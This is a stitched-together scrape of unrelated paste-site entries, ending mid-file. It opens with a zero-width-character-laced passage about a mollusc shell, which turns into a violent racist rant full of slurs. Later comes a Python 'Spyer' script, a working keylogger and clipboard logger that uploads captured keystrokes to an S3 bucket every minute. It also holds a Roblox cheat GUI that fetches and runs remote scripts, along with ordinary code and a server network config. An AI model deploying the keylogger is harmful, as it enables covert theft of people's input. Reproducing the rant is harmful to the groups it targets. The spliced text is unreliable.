‎f‎o‎u‎n‎d‎ ‎i‎n‎ ‎t‎r‎o‎p‎i‎c‎a‎l‎ ‎a‎n‎d‎ ‎s‎u‎b‎t‎r‎o‎p‎i‎c‎a‎l‎ ‎c‎o‎a‎s‎t‎a‎l‎ ‎w‎a‎t‎e‎r‎s‎ ‎a‎c‎r‎o‎s‎s‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎,‎ ‎i‎n‎h‎a‎b‎i‎t‎i‎n‎g‎ ‎m‎u‎d‎d‎y‎ ‎a‎r‎e‎a‎s‎ ‎c‎l‎o‎s‎e‎ ‎t‎o‎ ‎t‎h‎e‎ ‎s‎h‎o‎r‎e‎l‎i‎n‎e‎.‎ ‎T‎h‎e‎ ‎s‎h‎e‎l‎l‎,‎ ‎w‎h‎i‎c‎h‎ ‎i‎s‎ ‎v‎e‎r‎y‎ ‎c‎o‎m‎m‎o‎n‎,‎ ‎h‎a‎s‎ ‎a‎ ‎t‎h‎i‎c‎k‎n‎e‎s‎s‎ ‎o‎f‎ ‎u‎p‎ ‎t‎o‎ ‎3‎ ‎c‎e‎n‎t‎i‎m‎e‎t‎r‎e‎s‎ ‎(‎1‎.‎2‎ ‎i‎n‎c‎h‎e‎s‎)‎ ‎a‎n‎d‎ ‎v‎a‎r‎i‎e‎s‎ ‎i‎n‎ ‎f‎o‎r‎m‎ ‎–‎ ‎f‎o‎r‎ ‎e‎x‎a‎m‎p‎l‎e‎,‎ ‎i‎n‎ ‎t‎h‎e‎ ‎e‎l‎o‎n‎g‎a‎t‎i‎o‎n‎ ‎o‎f‎ ‎t‎h‎e‎ ‎w‎h‎o‎r‎l‎s‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎l‎o‎n‎g‎i‎t‎u‎d‎i‎n‎a‎l‎ ‎f‎o‎l‎d‎s‎ ‎–‎ ‎a‎s‎ ‎w‎e‎l‎l‎ ‎a‎s‎ ‎i‎n‎ ‎c‎o‎l‎o‎r‎,‎ ‎w‎i‎t‎h‎ ‎s‎o‎m‎e‎ ‎s‎p‎e‎c‎i‎m‎e‎n‎s‎ ‎e‎n‎t‎i‎r‎e‎l‎y‎ ‎w‎h‎i‎t‎e‎ ‎w‎h‎i‎l‎e‎ ‎o‎t‎h‎e‎r‎s‎ ‎h‎a‎v‎e‎ ‎b‎r‎o‎w‎n‎ ‎b‎a‎n‎d‎s‎.‎ ‎T‎h‎e‎ ‎y‎o‎u‎n‎g‎ ‎o‎f‎ ‎t‎h‎i‎s‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎h‎a‎v‎e‎ ‎f‎o‎l‎d‎s‎ ‎a‎n‎d‎ ‎s‎t‎r‎i‎a‎e‎ ‎t‎h‎a‎t‎ ‎a‎r‎e‎ ‎m‎u‎c‎h‎ ‎m‎o‎r‎e‎ ‎p‎r‎o‎m‎i‎n‎e‎n‎t‎.‎ ‎T‎h‎i‎s‎ ‎c‎o‎m‎p‎o‎s‎i‎t‎e‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎s‎h‎o‎w‎s‎ ‎f‎i‎v‎e‎ ‎d‎i‎f‎f‎e‎r‎e‎n‎t‎ ‎v‎i‎e‎w‎s‎ ‎o‎f‎ ‎a‎ ‎N‎.‎ ‎a‎r‎c‎u‎l‎a‎r‎i‎a‎ ‎s‎h‎e‎l‎l‎,‎ ‎w‎i‎t‎h‎ ‎a‎ ‎l‎e‎n‎g‎t‎h‎ ‎o‎f‎ ‎2‎.‎2‎ ‎c‎e‎n‎t‎i‎m‎e‎t‎r‎e‎s‎ ‎(‎0‎.‎8‎7‎ ‎i‎n‎c‎h‎e‎s‎)‎,‎ ‎t‎h‎a‎t‎ ‎w‎a‎s‎ ‎c‎o‎l‎l‎e‎c‎t‎e‎d‎ ‎i‎n‎ ‎M‎a‎d‎a‎g‎a‎s‎c‎a‎r‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎H‎.‎ ‎Z‎e‎l‎l‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎

B‎y‎e‎,‎ ‎g‎u‎y‎s‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎r‎u‎n‎ ‎o‎v‎e‎r‎ ‎s‎o‎m‎e‎ ‎n‎i‎g‎g‎e‎r‎s‎ ‎w‎i‎t‎h‎ ‎a‎ ‎s‎t‎e‎a‎m‎r‎o‎l‎l‎e‎r‎ ‎a‎n‎d‎ ‎m‎a‎k‎e‎ ‎t‎h‎e‎m‎ ‎i‎n‎t‎o‎ ‎n‎i‎g‎g‎e‎r‎ ‎p‎a‎n‎c‎a‎k‎e‎s‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎n‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎p‎u‎t‎ ‎s‎o‎m‎e‎ ‎c‎h‎i‎n‎k‎s‎ ‎i‎n‎t‎o‎ ‎a‎ ‎b‎l‎e‎n‎d‎e‎r‎ ‎a‎n‎d‎ ‎m‎a‎k‎e‎ ‎t‎h‎e‎m‎ ‎i‎n‎t‎o‎ ‎s‎y‎r‎u‎p‎ ‎w‎h‎i‎c‎h‎ ‎I‎ ‎w‎i‎l‎l‎ ‎p‎o‎u‎r‎ ‎o‎n‎t‎o‎ ‎m‎y‎ ‎n‎i‎g‎g‎e‎r‎ ‎p‎a‎n‎c‎a‎k‎e‎s‎.‎"
jV2TstZS,Untitled,Josif_tepe,C++,Sunday 14th of April 2024 10:39:09 AM CDT,"#include <iostream>
#include <queue>
using namespace std;
int main() {
    int n, m;
    cin >> n >> m;
    char mat[n][m];
    bool visited[n][m];
    
    int dist_S[n][m];
    int dist_E[n][m];
    int si, sj, ei, ej;
    
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            cin >> mat[i][j];
            visited[i][j] = false;
            if(mat[i][j] == 'S') {
                si = i;
                sj = j;
            }
            if(mat[i][j] == 'E') {
                ei = i;
                ej = j;
            }
            
            dist_S[i][j] = -1;
            dist_E[i][j] = -1;
        }
    }
    
    queue<int> q;
    q.push(si);
    q.push(sj);
    q.push(0);
    
    visited[si][sj] = true;
    
    int di[] = {-1, 1, 0, 0};
    int dj[] = {0, 0, -1, 1};
    
    
    while(!q.empty()) {
        int ci = q.front();
        q.pop();
        int cj = q.front();
        q.pop();
        int cekor = q.front();
        q.pop();
        
        if(mat[ci][cj] == 'E') {
            cout << cekor << endl;
            return 0;
        }
        
        for(int i = 0; i < 4; i++) {
            int ti = ci + di[i];
            int tj = cj + dj[i];
            
            if(ti >= 0 and ti < n and tj >= 0 and tj < m and !visited[ti][tj]) {
                
                if(mat[ti][tj] == '#') {
                    dist_S[ti][tj] = cekor + 1;
                }
                else {
                    q.push(ti);
                    q.push(tj);
                    q.push(cekor + 1);
                }
                visited[ti][tj] = true;

            }
        }
    }
    
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            visited[i][j] = false;
        }
    }
    
    q.push(ei);
    q.push(ej);
    q.push(0);
    visited[ei][ej] = true;
    while(!q.empty()) {
        int ci = q.front();
        q.pop();
        int cj = q.front();
        q.pop();
        int cekor = q.front();
        q.pop();
        
        for(int i = 0; i < 4; i++) {
            int ti = ci + di[i];
            int tj = cj + dj[i];
            
            if(ti >= 0 and ti < n and tj >= 0 and tj < m and !visited[ti][tj]) {
                if(mat[ti][tj] == '#') {
                    dist_E[ti][tj] = cekor + 1;
                }
                else {
                    q.push(ti);
                    q.push(tj);
                    q.push(cekor + 1);
                }
                visited[ti][tj] = true;

            }
        }
        
    }
    int res = -1;
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            if(mat[i][j] == '#') {
                if(dist_S[i][j] != -1 and dist_E[i][j] != -1) {
                    res = max(res, dist_S[i][j] + dist_E[i][j]);
                }
            }
        }
    }
    cout << res << endl;
    return 0;
}
"
Ac0WxAES,myaac samples insert 2,slawkens,MySQL,Sunday 14th of April 2024 10:33:21 AM CDT,"INSERT INTO `players` (`id`, `name`, `group_id`, `account_id`, `level`, `vocation`, `health`, `healthmax`, `experience`, `lookbody`, `lookfeet`, `lookhead`, `looklegs`, `looktype`, `maglevel`, `mana`, `manamax`, `manaspent`, `soul`, `town_id`, `posx`, `posy`, `posz`, `conditions`, `cap`, `sex`, `lastlogin`, `lastip`, `save`, `lastlogout`, `balance`, `deletion`, `created`, `hidden`, `comment`) VALUES (null, 'Rook Sample', 1, 1, 1, 0, 150, 150, 0, 118, 114, 38, 57, 130, 0, 0, 0, 0, 100, 1, 1000, 1000, 7, '', 400, 1, 1713108714, 2130706433, 1, 1713108714, 0, 0, 1713108714, 1, '');
INSERT INTO `players` (`id`, `name`, `group_id`, `account_id`, `level`, `vocation`, `health`, `healthmax`, `experience`, `lookbody`, `lookfeet`, `lookhead`, `looklegs`, `looktype`, `maglevel`, `mana`, `manamax`, `manaspent`, `soul`, `town_id`, `posx`, `posy`, `posz`, `conditions`, `cap`, `sex`, `lastlogin`, `lastip`, `save`, `lastlogout`, `balance`, `deletion`, `created`, `hidden`, `comment`) VALUES (null, 'Sorcerer Sample', 1, 1, 8, 1, 185, 185, 4200, 118, 114, 38, 57, 130, 0, 90, 90, 0, 100, 1, 1000, 1000, 7, '', 470, 1, 1713108714, 2130706433, 1, 1713108714, 0, 0, 1713108714, 1, '');
INSERT INTO `players` (`id`, `name`, `group_id`, `account_id`, `level`, `vocation`, `health`, `healthmax`, `experience`, `lookbody`, `lookfeet`, `lookhead`, `looklegs`, `looktype`, `maglevel`, `mana`, `manamax`, `manaspent`, `soul`, `town_id`, `posx`, `posy`, `posz`, `conditions`, `cap`, `sex`, `lastlogin`, `lastip`, `save`, `lastlogout`, `balance`, `deletion`, `created`, `hidden`, `comment`) VALUES (null, 'Druid Sample', 1, 1, 8, 2, 185, 185, 4200, 118, 114, 38, 57, 130, 0, 90, 90, 0, 100, 1, 1000, 1000, 7, '', 470, 1, 1713108714, 2130706433, 1, 1713108714, 0, 0, 1713108714, 1, '');
INSERT INTO `players` (`id`, `name`, `group_id`, `account_id`, `level`, `vocation`, `health`, `healthmax`, `experience`, `lookbody`, `lookfeet`, `lookhead`, `looklegs`, `looktype`, `maglevel`, `mana`, `manamax`, `manaspent`, `soul`, `town_id`, `posx`, `posy`, `posz`, `conditions`, `cap`, `sex`, `lastlogin`, `lastip`, `save`, `lastlogout`, `balance`, `deletion`, `created`, `hidden`, `comment`) VALUES (null, 'Paladin Sample', 1, 1, 8, 3, 185, 185, 4200, 118, 114, 38, 57, 129, 0, 90, 90, 0, 100, 1, 1000, 1000, 7, '', 470, 1, 1713108714, 2130706433, 1, 1713108714, 0, 0, 1713108714, 1, '');
INSERT INTO `players` (`id`, `name`, `group_id`, `account_id`, `level`, `vocation`, `health`, `healthmax`, `experience`, `lookbody`, `lookfeet`, `lookhead`, `looklegs`, `looktype`, `maglevel`, `mana`, `manamax`, `manaspent`, `soul`, `town_id`, `posx`, `posy`, `posz`, `conditions`, `cap`, `sex`, `lastlogin`, `lastip`, `save`, `lastlogout`, `balance`, `deletion`, `created`, `hidden`, `comment`) VALUES (null, 'Knight Sample', 1, 1, 8, 4, 185, 185, 4200, 118, 114, 38, 57, 131, 0, 90, 90, 0, 100, 1, 1000, 1000, 7, '', 470, 1, 1713108714, 2130706433, 1, 1713108714, 0, 0, 1713108714, 1, '');"
wqvvATH8,Spyer,unknown437,Python,Sunday 14th of April 2024 10:20:31 AM CDT,"import subprocess
from pynput.keyboard import Key, Listener
import logging
import time
import threading
import boto3
from uuid import uuid4

log_dir = """"
logging.basicConfig(filename=(log_dir + ""key_log.txt""), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

def get_clipboard_contents_linux():
    return subprocess.check_output(['xclip', '-selection', 'clipboard', '-o']).decode()

def keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

def clipboard_monitor():
    clipboard_content = get_clipboard_contents_linux()
    f = open(""clipboard.txt"", ""a"")
    f.write(clipboard_content + ""\n"")
    f.close()

    while True:
        new_clipboard_content = get_clipboard_contents_linux()
        if clipboard_content != new_clipboard_content:
            clipboard_content = new_clipboard_content
            f = open(""clipboard.txt"", ""a"")
            f.write(clipboard_content + ""\n"")
            f.close()
        
        time.sleep(1)

def upload_to_aws(file_path, bucket_name, key_name):
    s3 = boto3.client('s3')
    try:
        s3.upload_file(file_path, bucket_name, key_name)
    except Exception as e:
        pass

keylogger_thread = threading.Thread(target=keylogger)
clipboard_thread = threading.Thread(target=clipboard_monitor)

keylogger_thread.start()
clipboard_thread.start()

while True:
    host_id = subprocess.check_output(""hostid"", shell=True).decode().strip(""\n"")
    upload_to_aws(""key_log.txt"", ""backups-531"", f""{host_id}/key_log_{str(uuid4())}.txt"")
    upload_to_aws(""clipboard.txt"", ""backups-531"", f""{host_id}/clipboard_{str(uuid4())}.txt"")
    time.sleep(60)"
U0dpiets,biobizz,PiXLFAIL,C++,Sunday 14th of April 2024 10:03:37 AM CDT,"#include <iostream>
#include <fstream>
#include <map>
#include <vector>
#include <string>

using namespace std;

class Fertilizer {
public:
    Fertilizer(const string& name, const vector<int>& schedule) : name(name), schedule(schedule) {}

    string getName() const {
        return name;
    }

    int getAmount(int week) const {
        if (week >= 0 && week < schedule.size()) {
            return schedule[week];
        }
        return 0;
    }

private:
    string name;
    vector<int> schedule;
};

class GrowLog {
public:
    void saveWatering(int week, int waterAmount) {
        ofstream logFile(""grow_log.txt"", ios_base::app);

        if (logFile.is_open()) {
            logFile << ""Woche: "" << week << "", Wassermenge: "" << waterAmount << "" ml"" << endl;
            logFile.close();
        } else {
            cerr << ""Fehler: Kann die Datei 'grow_log.txt' nicht öffnen."" << endl;
        }
    }
};

class FertilizerPlan {
public:
    void addFertilizer(const Fertilizer& fertilizer) {
        fertilizers.push_back(fertilizer);
    }

    void run(GrowLog& log) {
        int currentWeek;
        cout << ""Aktuelle Woche eingeben (0-10): "";
        cin >> currentWeek;

        int waterAmount;
        cout << ""Wassermenge in Millilitern: "";
        cin >> waterAmount;

        for (const auto& fertilizer : fertilizers) {
            int fertilizerAmount = fertilizer.getAmount(currentWeek);
            cout << fertilizer.getName() << "": "" << fertilizerAmount * waterAmount / 1000.0 << "" ml"" << endl;
        }

        char save;
        cout << ""Möchten Sie diesen Gießvorgang speichern? (J/N): "";
        cin >> save;

        if (tolower(save) == 'j') {
            log.saveWatering(currentWeek, waterAmount);
            cout << ""Gießvorgang erfolgreich gespeichert."" << endl;
        }
    }

private:
    vector<Fertilizer> fertilizers;
};

int main() {
    // Überprüfen, ob die Datei ""grow_log.txt"" existiert, und ihren Inhalt ausgeben
    ifstream logFile(""grow_log.txt"");
    if (logFile.is_open()) {
        cout << ""Inhalt von grow_log.txt:"" << endl;
        string line;
        while (getline(logFile, line)) {
            cout << line << endl;
        }
        logFile.close();
    }
    cout << ""\n\n"";

    FertilizerPlan plan;
    GrowLog log;

    plan.addFertilizer(Fertilizer(""Root-Juice"", {4, 0, 0, 0, 0, 0, 0, 0, 0, 0}));
    plan.addFertilizer(Fertilizer(""BioGrow"", {0, 1, 1, 1, 1, 1, 1, 1, 1, 0}));
    plan.addFertilizer(Fertilizer(""BioBloom"", {0, 1, 2, 2, 3, 3, 4, 4, 4, 0}));
    plan.addFertilizer(Fertilizer(""BioHeaven"", {2, 0, 0, 0, 0, 0, 0, 0, 0, 0}));
    plan.addFertilizer(Fertilizer(""Top-Max"", {0, 1, 1, 1, 1, 4, 4, 4, 4, 0}));
    plan.addFertilizer(Fertilizer(""ActiVera"", {2, 2, 2, 3, 4, 4, 5, 5, 5, 0}));

    plan.run(log);

    return 0;
}
"
q1Mt2zWF,FE Gui RemiAPE,hacimiks,Lua,Sunday 14th of April 2024 10:02:10 AM CDT,"local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/thanhdat4461/OrionMoblie/main/source')))()
local Window = OrionLib:MakeWindow({Name = ""RemiAPE Gui"", HidePremium = false, SaveConfig = false, ConfigFolder = ""OrionTest"", IntroText = ""RemiAPE X Orion""})

    OrionLib:MakeNotification({
        Name = ""RemiAPE"",
        Content = ""Made by: aoki0x"",
        Image = ""rbxassetid://12117215397"",
        Time = 10
    })

	local Tab = Window:MakeTab({
        Name = ""Main"",
        Icon = ""rbxassetid://12053823591""
    })

    local Section = Tab:AddSection({
        Name = ""FE Scripts"",
    })

	Section:AddButton({
		Name = ""FE Carl Hub"",
		Callback = function()
			loadstring(game:HttpGet('https://raw.githubusercontent.com/carlcoded/carlispro/main/carlhub'))()
        end
	})

	Section:AddButton({
        Name = ""FE Universal Admin"",
        Callback = function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Trolling%20GUI.luau'))()
        end
    })

    Section:AddButton({
        Name = ""FE Admin Commands"",
        Callback = function()
            loadstring(game:HttpGet(""https://raw.githubusercontent.com/JoeScriptHub/GrimEx-Admin/main/GrimEx%20Admin""))()
        end
    })

    Section:AddButton({
        Name = ""FE Invisible Script"",
        Callback = function()
            loadstring(game:HttpGet('https://pastebin.com/raw/C168YFQB'))()
        end
    })

    Section:AddButton({
        Name = ""FE Patchma Hub Script"",
        Callback = function()
            loadstring(game:HttpGet(""https://raw.githubusercontent.com/aoki0x/aoki0x/main/PATCHMA%20HUB.lua""))()
        end
    })

    Section:AddButton({
        Name = ""FE Telekinesis V2"",
        Callback = function()
            loadstring(game:HttpGet(""https://pastebin.com/raw/iKxvzvbG""))
        end
    })

	local Tab2 = Window:MakeTab({
		Name = ""Miscellaneous"",
		Icon = ""rbxassetid://12623079242""
	})

	local Section5 = Tab2:AddSection({
		Name = ""Extras""
	})

	Section5:AddButton({
        Name = ""Infinite Yield"",
        Callback = function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
        end
    })

    Section5:AddButton({
        Name = ""Fly Gui V3"",
        Callback = function()
            loadstring(game:HttpGet(""https://raw.githubusercontent.com/aoki0x/aoki0x/main/Fly%20Gui.lua""))()
        end
    })

    Section5:AddButton({
        Name = ""Mobile Keyboard"",
        Callback = function()
            loadstring(game:HttpGet(""https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt"", true))()
        end
    })

    Section5:AddButton({
        Name = ""Mobile Cursor"",
        Callback = function()
            loadstring(game:HttpGet('https://pastefy.app/58d8d52G/raw'))()
        end
    })

    Section5:AddButton({
        Name = ""Fling Gui"",
        Callback = function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI'))()
        end
    })

    Section5:AddButton({
        Name = ""Sit Gui"",
        Callback = function()
            loadstring(game:HttpGet(""https://pastebin.com/raw/Qs3FzDFB""))()
        end
    })

    Section5:AddButton({
        Name = ""Headless + One Leg (One Leg R6)"",
        Callback = function()
            loadstring(game:HttpGet(""https://pastebin.com/raw/e0pecmKW""))()
        end
    })

    Section5:AddButton({
        Name = ""One Leg (R15)"",
        Callback = function()
            loadstring(game:HttpGet(""https://pastebin.com/raw/rw9sqWjJ""))()
        end
    })

    Section5:AddButton({
        Name = ""Korblox X Headless (Korblox Only R15)"",
        Callback = function()
            loadstring(game:HttpGet(""https://pastebin.com/raw/nu8nksBs""))()
        end
    })

    Section5:AddButton({
        Name = ""Character Animation Gui"",
        Callback = function()
            loadstring(game:HttpGet(""https://raw.githubusercontent.com/Invooker11/Outfit/main/OutfitCopier.lua""))()
        end
    })

    Section5:AddButton({
        Name = ""Outfit Copier (Need User Id)"",
        Callback = function()
            loadstring(game:HttpGet((""https://raw.githubusercontent.com/Invooker11/Outfit/main/OutfitCopier.lua""),true))()
        end
    })

    Section5:AddButton({
        Name = ""Auto Play Piano"",
        Callback = function()
            loadstring(game:HttpGet(""https://raw.githubusercontent.com/ZhenX201/Auto-Piano-Faded/main/source""))()
        end
    })

    Section5:AddButton({
        Name = ""Chat Bypasser (No Tags)"",
        Callback = function()
            loadstring(game:HttpGet(""https://raw.githubusercontent.com/Synergy-Networks/products/main/BetterBypasser/loader.lua"",true))()
        end
    })

    Section5:AddButton({
        Name = ""Godmode (Universal)"",
        Callback = function()
            loadstring(game:HttpGet(""https://raw.githubusercontent.com/zephyr10101/ignore-touchinterests/main/main"",true))()
        end
    })

	local Tab3 = Window:MakeTab({
		Name = ""Settings"",
		Icon = ""rbxassetid://11818627057""
	})

	local Section8 = Tab3:AddSection({
		Name = ""Humanoid""
	})

	Section8:AddButton({
		Name = ""Infinite Jump"",
		Callback = function()
			loadstring(game:HttpGet(""https://raw.githubusercontent.com/aoki0x/aoki0x/main/Infinite%20Jump%20Gui.lua""))()
        end
	})

	Section8:AddSlider({
        Name = ""Walkspeed"",
        Min = 0,
        Max = 400,
        Default = 16,
        Color = Color3.fromRGB(0, 0, 255),
        Increment = 1,
        ValueName = ""WALK1"",
        Callback = function(Value)
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
        end
    })

    Section8:AddSlider({
        Name = ""Jump Height"",
        Min = 0,
        Max = 400,
        Default = 50,
        Color = Color3.fromRGB(0, 0, 255),
        Increment = 1,
        ValueName = ""JUMP1"",
        Callback = function(Value)
            game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
        end
    })

	local Section7 = Tab3:AddSection({
		Name = ""Universal ESP""
	})

	Section7:AddButton({
		Name = ""Lightux ESP"",
		Callback = function()
			loadstring(game:HttpGet('https://pastebin.com/raw/3cKjwUCG'))()
        end
	})

	local Section9 = Tab3:AddSection({
		Name = ""Destroy Gui""
	})

	Section9:AddButton({
		Name = ""Destroy"",
		Callback = function()
			OrionLib:Destroy()
		end
	})
	OrionLib:Init()"
uGzE919K,Untitled,MuadDiib,autoconf,Sunday 14th of April 2024 09:50:13 AM CDT,"# network interface settings; autogenerated
# Please do NOT modify this file directly, unless you know what
# you're doing.
#
# If you want to manage parts of the network configuration manually,
# please utilize the 'source' or 'source-directory' directives to do
# so.
# PVE will preserve these directives, but will NOT read its network
# configuration from sourced files, so do not attempt to move any of
# the PVE managed interfaces into external files!

source /etc/network/interfaces.d/*

auto lo
iface lo inet loopback

iface lo inet6 loopback

auto eno1
iface eno1 inet static
        address 95.216.247.175/26
        gateway 95.216.247.129
        up route add -net 95.216.247.128 netmask 255.255.255.192 gw 95.216.247.129 dev eno1
        #route 95.216.247.128/26 via 95.216.247.129

iface eno1 inet6 static
        address 2a01:4f9:2b:29d0::2/64
        gateway fe80::1

auto vmbr0
iface vmbr0 inet static
        address 95.216.247.175/32
        bridge-ports none
        bridge-stp off
        bridge-fd 0
        bridge_maxwait 0
        pre-up brctl addbr vmbr0
        up ip route add 95.216.247.148/32 dev vmbr0
        up ip route add 95.216.247.160/32 dev vmbr0

auto vmbr1
iface vmbr1 inet static
        address 10.20.30.1/24
        bridge-ports none
        bridge-stp off
        bridge-fd 0
        post-up   echo 1 > /proc/sys/net/ipv4/ip_forward
        post-up iptables -t nat -A POSTROUTING -s '10.20.30.0/24' -o eno1 -j MASQUERADE
        post-down iptables -t nat -D POSTROUTING -s '10.20.30.0/24' -o eno1 -j MASQUERADE
"
nu8nksBs,aksjsbf,hacimiks,Lua,Sunday 14th of April 2024 09:47:29 AM CDT,"-- Gui to Lua
-- Version: 3.2

-- Instances:

local Main = Instance.new(""ScreenGui"")
local MainFrame = Instance.new(""Frame"")
local UICorner = Instance.new(""UICorner"")
local Korblox = Instance.new(""TextButton"")
local UICorner_2 = Instance.new(""UICorner"")
local Headless = Instance.new(""TextButton"")
local UICorner_3 = Instance.new(""UICorner"")

--Properties:

Main.Name = ""Main""
Main.Parent = game.CoreGui
Main.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

MainFrame.Name = ""MainFrame""
MainFrame.Parent = Main
MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
MainFrame.Position = UDim2.new(0.0751346573, 0, 0.743494451, 0)
MainFrame.Size = UDim2.new(0, 163, 0, 109)
MainFrame.Active = true
MainFrame.Draggable = true

UICorner.Parent = MainFrame

Korblox.Name = ""Korblox""
Korblox.Parent = MainFrame
Korblox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Korblox.Position = UDim2.new(0.0858895704, 0, 0.0825688019, 0)
Korblox.Size = UDim2.new(0, 134, 0, 42)
Korblox.Font = Enum.Font.GothamBlack
Korblox.Text = ""Korblox""
Korblox.TextColor3 = Color3.fromRGB(255, 255, 255)
Korblox.TextSize = 23.000
Korblox.TextWrapped = true
Korblox.MouseButton1Click:Connect(function()
	local ply = game.Players.LocalPlayer
	local chr = ply.Character
	chr.RightLowerLeg.MeshId = ""902942093""
	chr.RightLowerLeg.Transparency = ""1""
	chr.RightUpperLeg.MeshId = ""http://www.roblox.com/asset/?id=902942096""
	chr.RightUpperLeg.TextureID = ""http://roblox.com/asset/?id=902843398""
	chr.RightFoot.MeshId = ""902942089""
	chr.RightFoot.Transparency = ""1""
end)

UICorner_2.Parent = Korblox

Headless.Name = ""Headless""
Headless.Parent = MainFrame
Headless.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Headless.Position = UDim2.new(0.0858895704, 0, 0.522935808, 0)
Headless.Size = UDim2.new(0, 134, 0, 42)
Headless.Font = Enum.Font.GothamBlack
Headless.Text = ""Headless""
Headless.TextColor3 = Color3.fromRGB(255, 255, 255)
Headless.TextSize = 23.000
Headless.TextWrapped = true
Headless.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character.Head.Transparency = 1
	game.Players.LocalPlayer.Character.Head.Transparency = 1
	for i,v in pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) do
		if (v:IsA(""Decal"")) then
			v.Transparency = 1
		end
	end
end)

UICorner_3.Parent = Headless"
xWhZcQA3,collision,AlewAlow,Lua,Sunday 14th of April 2024 09:42:31 AM CDT,"local ReplicatedStorage = game:GetService(""ReplicatedStorage"")

local Matter = require(ReplicatedStorage.Shared.Libs.Matter)
local Components = require(ReplicatedStorage.Shared.Components)

local RotateVector2 = require(ReplicatedStorage.Shared.Utils.RotateVector2)
local GetOverlappingEntities = require(ReplicatedStorage.Shared.Utils.GetOverlappingEntities)
local GetEntityGlobalPosition = require(ReplicatedStorage.Shared.Utils.GetEntityGlobalPosition)
local GetEntityGlobalRotation = require(ReplicatedStorage.Shared.Utils.GetEntityGlobalRotation)
local GetEntityGlobalScale = require(ReplicatedStorage.Shared.Utils.GetEntityGlobalScale)
local GetEntityCanvas = require(ReplicatedStorage.Shared.Utils.GetEntityCanvas)

local CheckCollisions = require(ReplicatedStorage.Shared.Systems.CheckCollisions)
local ApplyVelocity = require(ReplicatedStorage.Shared.Systems.ApplyVelocity)

local function sweptAABB(
	velocity,
	position1,
	size1,
	
	position2,
	size2
)
	local xInvEntry, yInvEntry 
	local xInvExit, yInvExit 
	
	if velocity.X > 0 then
		xInvEntry = position2.X - (position1.X + size1.X / 2)
		xInvExit = (position2.X + size2.X / 2) - position1.X
	else
		xInvEntry = (position2.X + size2.X / 2) - position1.X
		xInvExit = position2.X - (position1.X + size1.X / 2)
	end
	
	if velocity.Y > 0 then
		yInvEntry = position2.Y - (position1.Y + size1.Y / 2)
		yInvExit = (position2.Y + size2.Y / 2) - position1.Y
	else
		yInvEntry = (position2.Y + size2.Y / 2) - position1.Y
		yInvExit = position2.Y - (position1.Y + size1.Y / 2)
	end
	
	local xEntry, yEntry 
	local xExit, yExit
	
	if velocity.X == 0 then
		xEntry = math.huge
		xExit = math.huge
	else
		xEntry = xInvEntry / velocity.X
		xExit = xInvExit / velocity.X
	end
	
	if velocity.X == 0 then
		yEntry = math.huge
		yExit = math.huge
	else
		yEntry = yInvEntry / velocity.Y
		yExit = yInvExit / velocity.Y
	end
	
	local entryTime = math.max(xEntry, yEntry)
	local exitTime = math.min(xExit, yExit)
	
	if entryTime > exitTime or (xEntry < 0 and yEntry < 0) or xEntry > 1 or yEntry > 1 then 
		return 1, Vector2.new(0, 0)
	end
	
	local normal
	
	if xEntry > yEntry then
		if xInvEntry < 0 then
			normal = Vector2.new(1, 0)
		else
			normal = Vector2.new(-1, 0)
		end
	else
		if yInvEntry < 0 then
			normal = Vector2.new(0, 1)
		else
			normal = Vector2.new(0, -1)
		end
	end
	
	return entryTime, normal
end

local function globalToLocalPosition(id, position, world)
	local parentRotation = 0
	local parentPosition = Vector2.zero
	local parentScale = Vector2.one

	local child = world:get(id, Components.Child)
	if child and world:contains(child.Parent) then
		parentPosition = GetEntityGlobalPosition(child.Parent, world)
		parentRotation = GetEntityGlobalRotation(child.Parent, world)
		parentScale = GetEntityGlobalScale(child.Parent, world)
	end
	
	return RotateVector2(position - parentPosition, -math.rad(parentRotation)) / parentScale
end

local function RespondToCollisions(world, state)
	for id1, transform1, velocity1, collider1, physics1 in world:query(Components.Transform, Components.Velocity, Components.Collider, Components.Physics) do
		local colliding = world:get(id1, Components.Colliding)
		local collidingWith = if colliding
			then colliding.CollidingWith
			else {}
		
		local globalPosition1 = GetEntityGlobalPosition(id1, world)
		local globalSize1 = GetEntityGlobalScale(id1, world) * collider1.Size
		
		local lastPosition = physics1.LastPosition or globalPosition1
		local lastChange = globalPosition1 - lastPosition
		
		if #collidingWith == 0 then
			continue
		end
		
		local minCollisionTime = math.huge
		local minCollisionNormal = nil
		
		for _, id2 in collidingWith do
			local sprite2 = world:get(id2, Components.Sprite)
			if sprite2 then
				world:insert(id2, sprite2:patch({
					ImageColor = Color3.new(0, 0, 1)
				}))
			end
			
			local collider2 = world:get(id2, Components.Collider)
			if not collider2 then
				continue
			end
			
			local transform2 = world:get(id2, Components.Transform)
			if not transform2 then
				continue
			end
			
